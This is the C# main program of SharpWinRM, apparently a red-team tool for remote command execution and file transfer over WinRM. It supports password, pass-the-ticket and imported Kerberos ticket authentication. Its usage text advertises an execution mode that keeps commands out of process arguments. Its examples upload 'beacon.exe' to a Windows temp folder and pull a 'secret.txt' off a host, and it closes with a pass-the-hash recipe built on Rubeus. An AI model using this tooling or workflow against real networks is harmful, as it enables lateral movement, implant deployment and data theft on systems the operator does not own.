using System;
using SharpWinRM.Commands;

namespace SharpWinRM
{
    internal class Program
    {
        static void Main(string[] rawArgs)
        {
            if (rawArgs.Length == 0) { Usage(); return; }

            var args = new ArgumentParser(rawArgs);

            if (args.Has("nocolors")) Helpers.NoColors = true;

            if (string.IsNullOrEmpty(args.Command) || args.Command == "help")
            { Usage(); return; }

            if (args.Command == "scan")
            { Scan.Run(args); return; }

            var ctx = BuildContext(args);
            if (ctx == null) return;

            switch (args.Command)
            {
                case "exec":     Exec.Run(args, ctx);     break;
                case "invoke":   Invoke.Run(args, ctx);   break;
                case "upload":   Upload.Run(args, ctx);   break;
                case "download": Download.Run(args, ctx); break;
                default:
                    Helpers.PrintError("Unknown command: " + args.Command);
                    Usage();
                    break;
            }
        }

        static WinRmContext BuildContext(ArgumentParser args)
        {
            string target = args.Get("target");
            if (string.IsNullOrEmpty(target))
            {
                Helpers.PrintError("Missing /target:");
                return null;
            }

            var ctx = new WinRmContext { Target = target };

            if (args.Has("port"))    ctx.Port      = int.Parse(args.Get("port"));
            if (args.Has("ssl"))   { ctx.Ssl = true; if (ctx.Port == 5985) ctx.Port = 5986; }
            if (args.Has("timeout")) ctx.TimeoutMs = int.Parse(args.Get("timeout"));

            // /ptt — use ticket already in current session
            if (args.Has("ptt"))
            {
                ctx.Auth     = AuthMode.Ptt;
                ctx.Username = args.Get("user") ?? "";
                ctx.Domain   = args.Get("domain");
                return ctx;
            }

            // /ticket: — import kirbi (file or base64) then connect
            if (args.Has("ticket"))
            {
                ctx.Auth     = AuthMode.Ticket;
                ctx.Ticket   = args.Get("ticket");
                ctx.Username = args.Get("user") ?? "";
                ctx.Domain   = args.Get("domain");
                return ctx;
            }

            // /password: — plaintext credential
            string user = args.Get("user");
            if (string.IsNullOrEmpty(user))
            {
                Helpers.PrintError("Missing /user: (or use /ptt or /ticket:)");
                return null;
            }
            if (!args.Has("password"))
            {
                Helpers.PrintError("Missing /password: (or use /ptt or /ticket:)");
                return null;
            }

            string domain = args.Get("domain");
            int bs = user.LastIndexOf('\\');
            if (bs >= 0 && domain == null) { domain = user.Substring(0, bs); user = user.Substring(bs + 1); }
            else { int at = user.IndexOf('@'); if (at >= 0 && domain == null) { domain = user.Substring(at + 1); user = user.Substring(0, at); } }

            ctx.Username = user;
            ctx.Domain   = domain;
            ctx.Password = args.Get("password");
            ctx.Auth     = AuthMode.Password;
            return ctx;
        }

        static void Usage()
        {
            Console.WriteLine();
            Console.WriteLine("  SharpWinRM");
            Console.WriteLine();
            Console.WriteLine("  COMMANDS");
            Console.WriteLine("    scan      Check if WinRM ports 5985/5986 are open (no auth required)");
            Console.WriteLine("    exec      Execute a command via cmd.exe (command visible in process args)");
            Console.WriteLine("    invoke    Execute a PowerShell command via stdin (command NOT in process args)");
            Console.WriteLine("    upload    Upload a local file to the remote host");
            Console.WriteLine("    download  Download a remote file to local disk");
            Console.WriteLine();
            Console.WriteLine("  AUTH (pick one)");
            Console.WriteLine("    /password:PASS     Plaintext password");
            Console.WriteLine("    /ptt               Use ticket already in session (klist)");
            Console.WriteLine("    /ticket:VALUE      Import kirbi then connect (file path or base64)");
            Console.WriteLine();
            Console.WriteLine("  REQUIRED");
            Console.WriteLine("    /target:HOST       Hostname or IP");
            Console.WriteLine("    /user:USER         Username (or DOMAIN\\USER)");
            Console.WriteLine("    /domain:DOMAIN     Domain (if not embedded in /user:)");
            Console.WriteLine();
            Console.WriteLine("  OPTIONS");
            Console.WriteLine("    /port:N            WinRM port (default: 5985)");
            Console.WriteLine("    /ssl               Use HTTPS (default port 5986)");
            Console.WriteLine("    /timeout:MS        Timeout ms (default: 30000)");
            Console.WriteLine("    /nocolors          Disable colored output");
            Console.WriteLine();
            Console.WriteLine("  COMMAND OPTIONS");
            Console.WriteLine("    exec / invoke:      /command:CMD");
            Console.WriteLine("    upload / download:  /local:PATH  /remote:PATH");
            Console.WriteLine();
            Console.WriteLine("  EXAMPLES");
            Console.WriteLine("    SharpWinRM.exe exec     /target:srv01 /domain:CORP /user:jdoe /password:Pass1 /command:whoami");
            Console.WriteLine("    SharpWinRM.exe exec     /target:srv01 /user:CORP\\jdoe /ptt /command:whoami");
            Console.WriteLine("    SharpWinRM.exe exec     /target:srv01 /user:CORP\\jdoe /ticket:jdoe.kirbi /command:whoami");
            Console.WriteLine("    SharpWinRM.exe invoke   /target:srv01 /user:CORP\\jdoe /ptt /command:Get-LocalUser");
            Console.WriteLine("    SharpWinRM.exe invoke   /target:srv01 /user:CORP\\jdoe /ptt /command:Get-Process | Select Name,Id");
            Console.WriteLine("    SharpWinRM.exe upload   /target:srv01 /user:CORP\\jdoe /ptt /local:beacon.exe /remote:C:\\Windows\\Temp\\b.exe");
            Console.WriteLine("    SharpWinRM.exe download /target:srv01 /user:CORP\\jdoe /ptt /remote:C:\\Users\\jdoe\\secret.txt /local:secret.txt");
            Console.WriteLine();
            Console.WriteLine("  PTH WORKFLOW (Rubeus → TGT → /ticket:)");
            Console.WriteLine("    Rubeus.exe asktgt /user:jdoe /rc4:HASH /domain:CORP /outfile:jdoe.kirbi");
            Console.WriteLine("    SharpWinRM.exe exec /target:srv01 /user:CORP\\jdoe /ticket:jdoe.kirbi /command:whoami");
            Console.WriteLine();
        }
    }
}
